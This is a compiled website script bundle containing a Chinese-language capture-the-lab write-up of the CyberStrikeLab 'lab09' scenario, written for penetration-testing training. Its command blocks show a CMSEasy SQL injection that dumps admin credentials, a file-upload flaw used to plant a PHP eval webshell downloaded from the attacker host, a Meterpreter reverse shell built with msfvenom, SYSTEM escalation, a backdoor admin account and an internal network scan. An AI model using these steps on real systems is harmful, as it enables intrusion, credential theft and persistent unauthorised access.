"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[23578],{70015:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>d,contentTitle:()=>l,default:()=>p,frontMatter:()=>i,metadata:()=>a,toc:()=>c});const a=JSON.parse('{"id":"Independent-Environment/CyberStrikeLab/Scene/lab09/index","title":"lab09","description":"\u573a\u666f\u4ecb\u7ecd","source":"@site/docs/Independent-Environment/CyberStrikeLab/Scene/lab09/index.md","sourceDirName":"Independent-Environment/CyberStrikeLab/Scene/lab09","slug":"/Independent-Environment/CyberStrikeLab/Scene/lab09/","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CyberStrikeLab/Scene/lab09/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/CyberStrikeLab/Scene/lab09/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"lab03","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CyberStrikeLab/Scene/lab03/"},"next":{"title":"lab15","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CyberStrikeLab/Scene/lab15/"}}');var t=s(74848),r=s(28453);const i={},l="lab09",d={},c=[{value:"\u5165\u53e3\u70b9",id:"\u5165\u53e3\u70b9",level:2},{value:"CMSEasy SQL \u6ce8\u5165",id:"cmseasy-sql-\u6ce8\u5165",level:2},{value:"CMSEasy \u6587\u4ef6\u4e0a\u4f20",id:"cmseasy-\u6587\u4ef6\u4e0a\u4f20",level:2},{value:"FLAG - 1",id:"flag---1",level:2},{value:"\u5165\u53e3\u70b9 \u4e0a\u7ebfmsf",id:"\u5165\u53e3\u70b9-\u4e0a\u7ebfmsf",level:2},{value:"msf\u65e0\u8111\u63d0\u6743",id:"msf\u65e0\u8111\u63d0\u6743",level:2},{value:"\u6743\u9650\u7ef4\u6301",id:"\u6743\u9650\u7ef4\u6301",level:2},{value:"\u5185\u7f51\u4fe1\u606f\u641c\u96c6",id:"\u5185\u7f51\u4fe1\u606f\u641c\u96c6",level:2}];function o(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"lab09",children:"lab09"})}),"\n",(0,t.jsxs)(n.admonition,{type:"info",children:[(0,t.jsx)(n.p,{children:"\u573a\u666f\u4ecb\u7ecd"}),(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"ATT&CK \u5b9e\u6218\u6846\u67b6 - lab9"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"\u5185\u7f51\u4eff\u771f"}),"\n",(0,t.jsx)(n.li,{children:"\u6a2a\u5411\u79fb\u52a8"}),"\n",(0,t.jsx)(n.li,{children:"\u57df\u6e17\u900f"}),"\n",(0,t.jsx)(n.li,{children:"\u591a\u5c42\u4ee3\u7406"}),"\n",(0,t.jsx)(n.li,{children:"\u6743\u9650\u7ef4\u6301"}),"\n"]}),"\n"]})]}),"\n",(0,t.jsx)(n.h2,{id:"\u5165\u53e3\u70b9",children:"\u5165\u53e3\u70b9"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"http://172.5.33.6/\n"})}),"\n",(0,t.jsx)(n.h2,{id:"cmseasy-sql-\u6ce8\u5165",children:"CMSEasy SQL \u6ce8\u5165"}),"\n",(0,t.jsxs)(n.p,{children:["\u53c2\u8003 ",(0,t.jsx)(n.a,{href:"https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/CmsEasy%20crossall_act.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md",children:"Awesome-POC/CMS \u6f0f\u6d1e / CmsEasy crossall_act.php SQL \u6ce8\u5165\u6f0f\u6d1e.md at master\u30fbThreekiii/Awesome-POC"})]}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u83b7\u53d6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ http get "http://172.5.33.6/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5"\nHTTP/1.1 200 OK\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nConnection: Keep-Alive\nContent-Type: text/html; charset=utf-8\nDate: Thu, 22 May 2025 19:27:33 GMT\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nKeep-Alive: timeout=5, max=100\nPragma: no-cache\nServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02\nSet-Cookie: PHPSESSID=gjh6kbq132tdnsu7fo0n5ua894; path=/\nTransfer-Encoding: chunked\nX-Powered-By: PHP/5.6.9\n\n{\n    "adddatetime": "2021-09-01 00:00:00",\n    "address": "admin",\n    "adminlang": "cn",\n    "adminlangdomain": "",\n    "alipaylogin": "",\n    "answer": "",\n    "avatar": "",\n    "buyarchive": "",\n    "checked": "1",\n    "collect": "2,4,3,46,14,73",\n    "couponidnum": "17:0:1",\n    "e_mail": "admin@qq.com",\n    "expired_time": "0",\n    "groupid": "2",\n    "headimage": "/html/upload/images/201907/15625455867367.png",\n    "integration": "0",\n    "intro": "",\n    "introducer": "0",\n    "isblock": "0",\n    "isdelete": "0",\n    "menoy": "100.07",\n    "nickname": "\u7ba1\u7406\u5458",\n    "notifiid": "",\n    "password": "a66abb5684c45962d887564f08346e8d",\n    "point": "0",\n    "qq": "1111",\n    "qqlogin": "",\n    "question": "",\n    "regtime": "0",\n    "sex": "",\n    "state": "0",\n    "tel": "admin",\n    "templatelang": "cn",\n    "templatelangdomain": "",\n    "userid": "1",\n    "userip": "",\n    "username": "admin",\n    "wechatlogin": ""\n}\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u67e5\u8be2\u6570\u636e\u5e93\u53ef\u77e5\u7ba1\u7406\u5458\u5bc6\u7801"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(41259).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"admin:admin123456 \n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5373\u53ef\u6210\u529f\u767b\u9646\u540e\u53f0 ",(0,t.jsx)(n.code,{children:"http://172.5.33.6/admin"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(51179).A+"",width:"2560",height:"1995"})}),"\n",(0,t.jsx)(n.h2,{id:"cmseasy-\u6587\u4ef6\u4e0a\u4f20",children:"CMSEasy \u6587\u4ef6\u4e0a\u4f20"}),"\n",(0,t.jsxs)(n.p,{children:["\u53c2\u8003 ",(0,t.jsx)(n.a,{href:"https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/CmsEasy%20update_admin.php%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md",children:"Awesome-POC/CMS\u6f0f\u6d1e/CmsEasy update_admin.php \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e.md at master \xb7 Threekiii/Awesome-POC"})]}),"\n",(0,t.jsx)(n.p,{children:"\u51c6\u5907\u597d\u8f7d\u8377"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ cat shell.php \n<?php @eval($_REQUEST['shell']) ?>\n\n\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ zip shell.zip shell.php \n  adding: shell.php (stored 0%)\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u7136\u540e\u751f\u6210poc\u6570\u636e\uff0c\u5176\u4e2d",(0,t.jsx)(n.code,{children:"lockString"}),"\u51fd\u6570\u6e90\u7801\u4f4d\u4e8e",(0,t.jsx)(n.a,{href:"https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/CmsEasy%20crossall_act.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain=1#L61",children:"Awesome-POC/CMS\u6f0f\u6d1e/CmsEasy crossall_act.php SQL\u6ce8\u5165\u6f0f\u6d1e.md at master \xb7 Threekiii/Awesome-POC"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ php -a\nInteractive shell\n\nphp > function lockString($txt,$key='cmseasy_sql')\nphp > {\nphp {     $chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-=+\";\nphp {     $nh = rand(0,64);\nphp {     $ch = $chars[$nh];\nphp {     $mdKey = md5($key.$ch);\nphp {     $mdKey = substr($mdKey,$nh%8, $nh%8+8);\nphp {     $txt = base64_encode($txt);\nphp {     $tmp = '';\nphp {     $i=0;$j=0;$k = 0;\nphp {     for ($i=0; $i<strlen($txt); $i++) {\nphp {         $k = $k == strlen($mdKey) ? 0 : $k;\nphp {         $j = ($nh+strpos($chars,$txt[$i])+ord($mdKey[$k++]))%64;\nphp {         $tmp .= $chars[$j];\nphp {     }\nphp {     return urlencode($ch.$tmp);\nphp { }\n\nphp > echo lockString('http://172.16.233.2/shell.zip','cmseasy_url');\nYWWK%3DYRysHC9CIwCuJxx9IBWrIx2-WUfpXRyFWlK8\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u7136\u540e\u89e6\u53d1\u4e0b\u8f7d"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"http://172.5.33.6/index.php?case=update&act=downfile&admin_dir=admin&site=default&url=YWWK%3DYRysHC9CIwCuJxx9IBWrIx2-WUfpXRyFWlK8\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6210\u529f\u4e0a\u4f20webshell"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(46895).A+"",width:"1542",height:"1040"})}),"\n",(0,t.jsx)(n.h2,{id:"flag---1",children:"FLAG - 1"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"C:/flag.txt\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"img",src:s(14708).A+"",width:"1542",height:"1040"})}),"\n",(0,t.jsx)(n.h2,{id:"\u5165\u53e3\u70b9-\u4e0a\u7ebfmsf",children:"\u5165\u53e3\u70b9 \u4e0a\u7ebfmsf"}),"\n",(0,t.jsx)(n.p,{children:"\u751f\u6210\u4e00\u4e2a\u8f7d\u8377\u4e0a\u53bb"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.233.2 LPORT=8888 -f exe -o exp-172.16.233.2-8888.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\nSaved as: exp-172.16.233.2-8888.exe\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u4e0a\u4f20\u5230\u9776\u673a\u5e76\u6267\u884c"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ msfconsole -q\n[*] Starting persistent handler(s)...\nmsf6 > use multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp\npayload => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set lport 8888\nlport => 8888\nmsf6 exploit(multi/handler) > set lhost 0.0.0.0\nlhost => 0.0.0.0\nmsf6 exploit(multi/handler) > exploit \n[*] Started reverse TCP handler on 0.0.0.0:8888 \n[*] Sending stage (203846 bytes) to 172.5.33.6\n[*] Meterpreter session 1 opened (172.16.233.2:8888 -> 172.5.33.6:49682) at 2025-05-23 11:57:00 +0800\n\nmeterpreter > sysinfo \nComputer        : WIN-784BAKDI0AC\nOS              : Windows Server 2016 (10.0 Build 14393).\nArchitecture    : x64\nSystem Language : zh_CN\nDomain          : WORKGROUP\nLogged On Users : 0\nMeterpreter     : x64/windows\nmeterpreter > getuid \nServer username: NT AUTHORITY\\NETWORK SERVICE\n"})}),"\n",(0,t.jsx)(n.h2,{id:"msf\u65e0\u8111\u63d0\u6743",children:"msf\u65e0\u8111\u63d0\u6743"}),"\n",(0,t.jsxs)(n.p,{children:["\u76f4\u63a5\u65e0\u8111",(0,t.jsx)(n.code,{children:"getsystem"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"meterpreter > getsystem \n...got system via technique 4 (Named Pipe Impersonation (RPCSS variant)).\nmeterpreter > getuid \nServer username: NT AUTHORITY\\SYSTEM\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u6743\u9650\u7ef4\u6301",children:"\u6743\u9650\u7ef4\u6301"}),"\n",(0,t.jsx)(n.p,{children:"\u7b80\u5355\u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u7528\u6237"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"C:\\Users\\Administrator\\Desktop>net user randark qazpllm123# /add\nnet user randark qazpllm123# /add\nThe command completed successfully.\n\n\nC:\\Users\\Administrator\\Desktop>net localgroup administrators randark /add\nnet localgroup administrators randark /add\nThe command completed successfully.\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\u5185\u7f51\u4fe1\u606f\u641c\u96c6",children:"\u5185\u7f51\u4fe1\u606f\u641c\u96c6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"C:\\Users\\Administrator\\Desktop>.\\fscan.exe -h 10.6.6.0/24\n.\\fscan.exe -h 10.6.6.0/24\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n(icmp) Target 10.6.6.10       is alive\n(icmp) Target 10.6.6.55       is alive\n(icmp) Target 10.6.6.88       is alive\n[*] Icmp alive hosts len is: 3\n10.6.6.55:88 open\n10.6.6.10:3306 open\n10.6.6.88:445 open\n10.6.6.55:445 open\n10.6.6.10:445 open\n10.6.6.88:139 open\n10.6.6.55:139 open\n10.6.6.10:139 open\n10.6.6.88:135 open\n10.6.6.55:135 open\n10.6.6.10:135 open\n10.6.6.55:80 open\n10.6.6.10:80 open\n[*] alive ports len is: 13\nstart vulscan\n[*] NetInfo \n[*]10.6.6.55\n   [->]DC\n   [->]10.6.6.55\n[*] NetInfo \n[*]10.6.6.10\n   [->]WIN-784BAKDI0AC\n   [->]172.5.33.6\n   [->]10.6.6.10\n[*] NetBios 10.6.6.88       cyberweb.cyberstrikelab.com         Windows Server 2016 Standard 14393\n[*] NetInfo \n[*]10.6.6.88\n   [->]cyberweb\n   [->]10.6.6.88\n[*] OsInfo 10.6.6.88    (Windows Server 2016 Standard 14393)\n[*] OsInfo 10.6.6.55    (Windows Server 2016 Standard 14393)\n[*] WebTitle http://10.6.6.10          code:200 len:77272  title:\u4e2d\u6587\u7f51\u9875\u6807\u9898\n[*] WebTitle http://10.6.6.55          code:200 len:703    title:IIS Windows Server\n[+] PocScan http://10.6.6.55 poc-yaml-active-directory-certsrv-detect \n"})})]})}function p(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(o,{...e})}):o(e)}},41259:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250528-112813-cdbb00230b29fdaad6d9bbdcf3111bbc.png"},51179:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250529-112924-2bdb8270ff56f88de1ee555aa5355354.png"},46895:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250547-114755-234a772aa62269507257d33bb952a0b3.png"},14708:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/image_20250553-115310-c8670b45a616c60caae84f46bb4e2363.png"},28453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>l});var a=s(96540);const t={},r=a.createContext(t);function i(e){const n=a.useContext(r);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),a.createElement(r.Provider,{value:n},e.children)}}}]);